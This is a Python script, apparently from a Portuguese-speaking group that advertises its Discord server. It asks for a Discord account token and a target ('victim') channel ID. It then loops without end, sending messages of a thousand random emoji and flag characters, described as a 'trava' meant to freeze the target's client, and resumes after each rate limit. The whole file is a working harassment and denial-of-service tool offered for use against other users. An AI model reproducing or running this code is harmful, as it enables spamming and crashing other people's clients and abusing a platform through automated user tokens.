#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json

from requests import post
from os import system, name
from time import sleep
from random import choices
from threading import Thread

# CORES AQUI BABY#
red = "\033[91;1m"
reset = "\033[0m"
green = "\033[92;1m"
cyan = "\033[96;1m"
yellow = "\033[93;1m"
magenta = "\033[95;1m"
blue = "\033[94;1m"
white = "\033[97;1m"
blink = "\033[5m"


print(f"""{cyan}
                  ++++++++++++ 
                ++++++++++++++++++ 
              ++++++++++++++++++++++ 
             ++++++++++++++++++++++++ + ++++ 
            ++++++++++++++++++++++++ +++ ++++++       Siga-nos no servidor do discord! https://discord.gg/v5d3PZ9
            ++++++++++++++++++++++++++++++++++++      Follow us in our discord server! https://discord.gg/v5d3PZ9
             ++++++++++++++++++++++++++++++++++++     
             :::::::::,a@@a,:::::,a@a,++++++++++. 
        .ooOOOOOOOOOOo@@@@@@oOoOo@@@@@,++++++++/:. 
     o OOOOOOOOOOOOo@@@@@@@@@oOOo@@@@@@,++++++/::: 
  o oOOOOOOOOOOOOOo@@@@@@@@@@@oOo@@@@@@a  '::::::: 
 oOoOOOOOOOOOOOOOOo@@@@@@@@@@@oOo@@@@@@@   ::::::: 
oOOOOOOOOOOOOOOOOo@@@@@@@@@@@@oOo@@@@@@@   ::: ::' 
oOOOOOOOOOOOOOOOOo`  '@@@@@@@@oOo` '@@@@  ,:'  ' 
oOOOOOOO%%%%%OOOOo    @@@@@@@@oOo   @@@a 
 oOOOO;%%%.%%%OOOo.  ,@@@@@@@oOOo. ,@@@' 
  oOOO%%%.%%%%%OOOoa@@@@@@@@oOOOo@@@@@' 
   OOO%%%.%%%%%%OOo@@@@@@@@oOOOOOo@@@'        .,;%%%%%;. 
    OOO%%.%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%//%%%%%%%%% 
      OO%%.%%%%%%%%%%%%%%%%;%%%%%%%%%%%%%%//%%%%%%%%%%%; 
        O%%.....';%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%;' 
          %%.............%%%%%%%%%%%%%%%%%%%%%%%;' 
           %%............`%%,   """"""""""""" 
            %%............%%; 
             %%...........%%; 
              %%%%%%%%%%%%%; 
               `%%%%%%%%%;
""")

sleep(2)
system(['clear', 'cls'][name == 'nt'])

print(white + """
 <=======]}======
    --.   /|
   _\"/_.'/
 .'._._,.'
 :/ \{}/
(L  /--',----._
    |          \\
   : /-\ .'-'\ / |
    \\, ||    \|
     \/ ||    ||                     
""")

sleep(2)
system(['clear', 'cls'][name == 'nt'])

def gen_fvcker():
	arr = ['🐒', '🍌', '🇧🇲', '🇦🇨', '🇦🇷', '🇧🇳', '🇬🇾', '🇮🇶', '🇸🇸', '🇻🇺', '🇼🇫', '🇹🇳']
	return f"**{''.join(choices(arr, k=1000))}**"

def send_fvcker(token, channel_id):
	headers = {
		'Authorization': token,
		'User-Agent': 'Mozilla/5.0'
	}
	payload = {
		'content': gen_fvcker()
	}
	req = post(
		f'https://discord.com/api/v8/channels/{channel_id}/messages',
		headers=headers,
		json=payload
	)
	if req.status_code == 200:
		print('Trava sendo enviado para a vítima. Apenas relaxe e goze! :)')
	elif req.status_code == 429:
		retry_t = json.loads(req.text)['retry_after']
		print(f'O trava será enviado novamente em {retry_t} segundos...')
		sleep(retry_t)
	else:
		print(f'Que porra é essa? Por favor, verifique o ID ou o seu próprio token. Obrigado!')

token  = '' # Token aqui
channel = '' # Canal/vítima pra atacar

if (token or channel) == '':
	print(white + """
 /$$      /$$                                         /$$
| $$$    /$$$                                        | $$
| $$$$  /$$$$  /$$$$$$  /$$$$$$$  /$$   /$$  /$$$$$$ | $$
| $$ $$/$$ $$ |____  $$| $$__  $$| $$  | $$ |____  $$| $$
| $$  $$$| $$  /$$$$$$$| $$  \ $$| $$  | $$  /$$$$$$$| $$
| $$\  $ | $$ /$$__  $$| $$  | $$| $$  | $$ /$$__  $$| $$
| $$ \/  | $$|  $$$$$$$| $$  | $$|  $$$$$$/|  $$$$$$$| $$
|__/     |__/ \_______/|__/  |__/ \______/  \_______/|__/                                                                                                                                                                         
""")
	sleep(2)
	print(" ")
	print(cyan + "Primeiramente, ative o modo desenvolvedor nas configurações do seu Discord.")
	sleep(2)
	print(" ")
	print( green + "Logo em seguida, vá para o chat de quem você deseja atacar (user/server/grupo).")
	sleep(2)
	print(" ")
	print(magenta + "Na URL de seu navegador, aparecerá o ID da mesma. Copie e cole abaixo.")
	sleep(2)
	print(" ")
	print(yellow + "O script não funciona em quem está offline.")
	sleep(2)
if token == '':
	token = input('Insira seu token aqui: ')

if channel == '':
	channel = input('Transcreva abaixo o ID da(s) vítima(s): ')

while True:
	send_fvcker(token, channel)
